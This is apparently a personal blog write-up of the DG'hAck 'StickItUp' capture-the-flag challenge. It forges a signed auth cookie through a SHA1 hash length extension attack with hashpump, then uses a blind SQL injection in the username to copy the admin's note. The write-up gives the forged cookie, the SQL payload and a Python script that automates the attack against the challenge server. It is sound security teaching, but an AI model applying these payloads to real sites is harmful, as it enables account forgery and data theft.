---
title: "Writeup DG'hAck: StickItUp"
date: 2020-11-30T11:26:24+01:00
draft: false
tags: ["blog", "security", "ctf", "dghack"]
type: "posts"
showDate: true
---

When starting this challenge, we're greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:

[![The dashboard](/assets/dghack/stick-it-up-dashboard.png)](/assets/dghack/stick-it-up-dashboard.png)

We're asked to find a note created by the `admin` user. I started by trying a few SQLi on the login page (they didn't work), and noticed this in the source code:

```php
<!-- $_COOKIES['auth'] = 'testuser:' . sha1(SECRET_KEY . 'testuser'); -->
```

So the `auth` cookie format is `username:hash`, where the hash is a SHA1 of a secret plus the username.

Now this **should** immediatly make you think of an [hash key length extension attack](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks). It allows an attacker to append arbitrary data at the end of the hashed value.

Looking at the cookies, we do find the hash:

```
test:14dc77bd8d95f3093afd7b8538a518ac17dcac14
```

Let's check that the attack is working, using the [hashpump tool](https://github.com/bwall/HashPump):

```bash
$ hashpump -s 14dc77bd8d95f3093afd7b8538a518ac17dcac14 -d test -a suffix -k 16
6cfe1c2b324630def13b186bb3f1c675e79d8c23
test\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0suffix
```

The first line is the new hash, the second is the updated data. I tried different keylengths before finding the right one. The cookie we have to set is:

```
auth=test%C2%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C2%A0suffix%3A6cfe1c2b324630def13b186bb3f1c675e79d8c23
```

*Warning: if you struggle to generate the cookie, be sure that you pasted the username correctly; for example in python use `b""` instead of `""`, or directly use the `hashpumpy` module.*

After a quick reload, we see:

[![The edited username seen when logging in](/assets/dghack/stick-it-up-edited-username.png)](/assets/dghack/stick-it-up-edited-username.png)

Which confirms that the exploit is working. For the next part, we have to notice this message on the registration form:

[![The registration form](/assets/dghack/stick-it-up-only-letters-numbers.png)](/assets/dghack/stick-it-up-only-letters-numbers.png)

While it's not unusual for the charset of a username to be restricted, in our case we're free to add any character that we want. It's worth a shot to try an SQLi.

After adding a single quote to the username, we can't create notes anymore. This is a blind SQLi!

To help create a payload, we can guess both the table name and structure, as well as the query:

```sql
CREATE TABLE note (
    username text,
    title text,
    content text
);

-- Add a sample flag.
INSERT INTO note VALUES ("admin", "flag", "flag");

-- This is the query we're trying to break.
INSERT INTO notes VALUES (username, "title", "content");
```

[SQL Fiddle](http://sqlfiddle.com) was of great help. The injection we can find, after a few attempts, is:

```
","",""), ("test", "flag", (select content from note a limit 1))#
```

Note the table alias, which I forgot to add for quite a while. The injection works by inserting a second row, in the account that we want, with the first note in the table.

After creating the updated username and hash, logging in with the forged cookie, and attempting to create a note, we switch to the `test` account, and see:

[![The note of the test user](/assets/dghack/stick-it-up-flag.png)](/assets/dghack/stick-it-up-flag.png)

Here we go, the flag is `-+-{{akUX7Aihx9}}-+-`.

---

Bonus: the script I used to easily try different SQLi:

```python
import sys
import requests
import hashpumpy
import urllib.parse

DATA = "test"
SIGNATURE = "14dc77bd8d95f3093afd7b8538a518ac17dcac14"

suffix = sys.argv[1]

new_signature, new_string = hashpumpy.hashpump(SIGNATURE, DATA, suffix, 16)
cookie = urllib.parse.quote(new_string + b":" + new_signature.encode())

requests.post(
    "http://stickitup.chall.malicecyber.com/notes.php",
    data={
        "title": "test",
        "text": "test",
    },
    cookies={
        "auth": cookie,
    },
)
```

---

[View all of the DG'hAck articles](/tags/dghack).
